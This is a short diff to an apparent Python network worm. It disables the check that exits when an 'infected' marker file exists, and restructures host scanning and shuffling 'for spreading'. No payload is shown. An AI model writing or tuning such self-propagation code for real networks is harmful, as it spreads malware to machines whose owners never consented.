@@ -165,7 +165,7 @@ def main():
 
     if os.path.exists(infected_Marker):
       print(comp_Msg)
-      sys.exit()
+      # sys.exit()
 
 
     try:
@@ -178,14 +178,14 @@ def main():
 
   interface_list = netifaces.interfaces()
   interface_list.remove(loopback)
-
+  networkHosts = scanner()
 
   for interface in interface_list:
     print("Interface: ", interface)
 
     ip_addr = thisIP(interface)
     print(ip_addr)
-    networkHosts = scanner()
+    # networkHosts = scanner()
     print(networkHosts)
     
     for ip in networkHosts:
@@ -197,8 +197,8 @@ def main():
 
     # networkHosts.remove(ip_addr)
     
-    #suffle hosts for spreading
-    random.shuffle(networkHosts)
+  #suffle hosts for spreading
+  random.shuffle(networkHosts)
 
   print("Found hosts: ", networkHosts)
 
